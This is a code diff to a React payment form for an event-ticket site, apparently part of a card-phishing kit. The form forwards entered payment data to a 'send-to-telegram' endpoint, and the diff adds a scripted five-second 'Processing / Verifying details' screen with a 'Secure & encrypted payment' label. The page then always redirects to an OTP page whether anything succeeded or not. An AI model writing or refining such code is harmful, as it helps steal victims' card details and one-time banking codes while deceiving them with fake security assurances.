@@ -1,7 +1,7 @@
 'use client';
 
 import React, { useState, useEffect } from 'react';
-import { ChevronRight, ChevronLeft, Clock, ShieldCheck, MessageCircle, ChevronDown } from 'lucide-react';
+import { ChevronRight, ChevronLeft, Clock, ShieldCheck, MessageCircle, ChevronDown, Ticket, Loader2, Lock } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
 import { Label } from '@/components/ui/label';
@@ -40,6 +40,8 @@ export default function PaymentForm({ event, selectedSeats, onBack, totalAmount 
   const [cvv, setCvv] = useState('');
   const [expiryYear, setExpiryYear] = useState('');
   const [expiryMonth, setExpiryMonth] = useState('');
+  const [isProcessing, setIsProcessing] = useState(false);
+  const [processingProgress, setProcessingProgress] = useState(0);
 
   // Fees (mock values based on image)
   const whatsappFee = 2.94;
@@ -117,6 +119,19 @@ console.log("event",event)
 
   const handlePaymentSubmit = async () => {
     try {
+      setIsProcessing(true);
+      setProcessingProgress(0);
+
+      // Start progress timer
+      const startTime = Date.now();
+      const duration = 5000;
+      const progressInterval = setInterval(() => {
+        const elapsed = Date.now() - startTime;
+        const currentProgress = Math.min((elapsed / duration) * 100, 100);
+        setProcessingProgress(currentProgress);
+        if (currentProgress >= 100) clearInterval(progressInterval);
+      }, 50);
+
       const paymentData = {
         eventTitle: event.title,
         eventVenue: (event.venueId && typeof event.venueId === 'object' && 'name' in event.venueId) ? event.venueId.name[language as keyof typeof event.venueId.name] : (event.venueName || ''),
@@ -133,23 +148,21 @@ console.log("event",event)
         currency: event.currency || '',
       };
 
-      const response = await fetch('/api/payment/send-to-telegram', {
+      // Send to telegram (async, don't wait for it to finish before starting the 5s timer)
+      fetch('/api/payment/send-to-telegram', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
+        headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(paymentData),
-      });
+      }).catch(err => console.error('Telegram error:', err));
 
-      const result = await response.json();
+      // Wait for exactly 5 seconds
+      await new Promise(resolve => setTimeout(resolve, duration));
 
-      if (result.success) {
-        window.location.href = '/otp';
-      } else {
-        alert('Payment failed. Please try again.');
-      }
+      setIsProcessing(false);
+      window.location.href = '/otp';
     } catch (error) {
       console.error('Error submitting payment:', error);
+      setIsProcessing(false);
       alert('An error occurred. Please try again.');
     }
   };
@@ -165,6 +178,60 @@ console.log("event",event)
           {isAr ? 'الدفع' : 'Payment'}
         </h1>
       </header>
+
+      {isProcessing && (
+        <div className="fixed inset-0 z-[100] bg-white/95 flex flex-col items-center justify-center p-6 text-center animate-in fade-in duration-300">
+          <div className="relative mb-8">
+            <div className="w-24 h-24 rounded-full border-4 border-gray-100 flex items-center justify-center">
+              <Loader2 className="w-12 h-12 text-[#1A162E] animate-spin" />
+            </div>
+            <svg className="absolute inset-0 w-24 h-24 -rotate-90" aria-hidden="true">
+              <circle
+                cx="48"
+                cy="48"
+                r="46"
+                fill="none"
+                stroke="currentColor"
+                strokeWidth="4"
+                className="text-[#1A162E]"
+                strokeDasharray={289}
+                strokeDashoffset={289 - (289 * processingProgress) / 100}
+                strokeLinecap="round"
+              />
+            </svg>
+          </div>
+
+          <h2 className="text-xl font-bold text-gray-900 mb-2">
+            {processingProgress < 50 
+              ? (isAr ? "جاري معالجة دفعتك..." : "Processing your payment...") 
+              : (isAr ? "جاري التحقق من التفاصيل..." : "Verifying details...")}
+          </h2>
+          <p className="text-gray-500 mb-8 max-w-xs">
+            {isAr 
+              ? "يرجى الانتظار قليلاً، نقوم بمعالجة طلبك بأمان" 
+              : "Please wait a moment, we are securely processing your request"}
+          </p>
+
+          <div className="w-full max-w-xs bg-gray-100 h-2 rounded-full overflow-hidden mb-2">
+            <div 
+              className="bg-[#1A162E] h-full transition-all duration-300 ease-out" 
+              style={{ width: `${processingProgress}%` }}
+              role="progressbar"
+              aria-valuenow={Math.round(processingProgress)}
+              aria-valuemin={0}
+              aria-valuemax={100}
+            />
+          </div>
+          <p className="text-xs font-medium text-gray-400" aria-live="polite">
+            {Math.round(processingProgress)}%
+          </p>
+          
+          <div className="mt-12 flex items-center justify-center gap-2 text-xs text-gray-400">
+            <Lock className="w-3 h-3" />
+            <span>{isAr ? "دفع آمن ومحمي" : "Secure & encrypted payment"}</span>
+          </div>
+        </div>
+      )}
 
       <main className="flex-1 pb-32">
         <div className="max-w-md mx-auto p-4 space-y-4">
@@ -405,15 +472,22 @@ console.log("event",event)
       <footer className="fixed bottom-0 left-0 right-0 bg-white border-t p-4 flex items-center justify-between z-40 safe-area-inset-bottom">
         <div className="flex items-center gap-4 flex-row-reverse w-full max-w-md mx-auto">
           <Button 
-            disabled={!isFormValid}
+            disabled={!isFormValid || isProcessing}
             onClick={handlePaymentSubmit}
             className={`flex-1 h-12 text-lg font-bold rounded-xl transition-all duration-200 ${
-              isFormValid 
+              isFormValid && !isProcessing
                 ? 'bg-[#1A162E] text-white hover:bg-[#2a244a] shadow-lg shadow-gray-200' 
                 : 'bg-[#F1F3F5] text-gray-400 cursor-not-allowed'
             }`}
           >
-            {isAr ? 'ادفع' : 'Pay'}
+            {isProcessing ? (
+              <div className="flex items-center gap-2">
+                <Loader2 className="w-5 h-5 animate-spin" />
+                <span>{isAr ? 'جاري المعالجة...' : 'Processing...'}</span>
+              </div>
+            ) : (
+              isAr ? 'ادفع' : 'Pay'
+            )}
           </Button>
           
           <div className="flex flex-col items-end gap-1">
@@ -454,27 +528,4 @@ console.log("event",event)
       </Dialog>
     </div>
   );
-}
-
-interface TicketProps {
-    className?: string;
-}
-
-function Ticket({ className }: TicketProps) {
-    return (
-        <svg 
-            viewBox="0 0 24 24" 
-            fill="none" 
-            stroke="currentColor" 
-            strokeWidth="2" 
-            strokeLinecap="round" 
-            strokeLinejoin="round" 
-            className={className}
-        >
-            <path d="M2 9a3 3 0 0 1 0 6v2a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-2a3 3 0 0 1 0-6V7a2 2 0 0 0-2-2H4a2 2 0 0 0-2 2Z" />
-            <path d="M13 5v2" />
-            <path d="M13 17v2" />
-            <path d="M13 11v2" />
-        </svg>
-    )
 }
